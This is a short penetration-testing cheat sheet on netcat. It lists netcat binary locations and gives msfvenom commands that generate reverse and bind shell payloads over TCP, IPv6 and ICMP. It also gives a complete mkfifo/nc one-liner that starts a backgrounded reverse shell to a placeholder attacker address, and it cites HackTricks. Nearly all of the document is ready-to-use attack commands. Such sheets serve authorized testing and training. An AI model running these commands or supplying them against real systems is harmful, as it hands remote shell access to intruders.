# Manual

## 01 - Common Files

```
/usr/bin/nc
/usr/bin/nc.openbsd
/usr/bin/ncat
/usr/bin/nc.traditional
```

## 02 - Generate Payloads

### 2.1 - OpenBSD Variant

#### 2.1.1 - Reverse Shell

```
$ msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<PORT>
```

#### 2.1.2 - Bind Shell

```
$ msfvenom -p cmd/unix/bind_netcat lport=<PORT>
```

### 2.2 - Traditional GNU Variant

#### 2.2.1 - Reverse Shell

```
$ msfvenom -p cmd/unix/reverse_netcat_gaping lhost=<IP> lport=<PORT>
```

#### 2.2.2 - Bind Shell

```
$ msfvenom -p cmd/unix/bind_netcat_gaping lport=<PORT>

$ msfvenom -p cmd/unix/bind_netcat_gaping_ipv6 lport=<PORT>
```

### 2.3 - ICMP Protocol

#### 2.3.1 - Reverse Shell

```
$ msfvenom -p cmd/unix/pingback_reverse lhost=<IP> lport=<PORT>
```

#### 2.3.2 - Bind Shell

```
$ msfvenom -p cmd/unix/pingback_bind lport=<PORT>
```

## 03 - Execute Payloads

### 3.1 - Background Process

```
$ (mkfifo /tmp/f; nc <attacker_IP> <attacker_PORT> 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f) &
```

---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)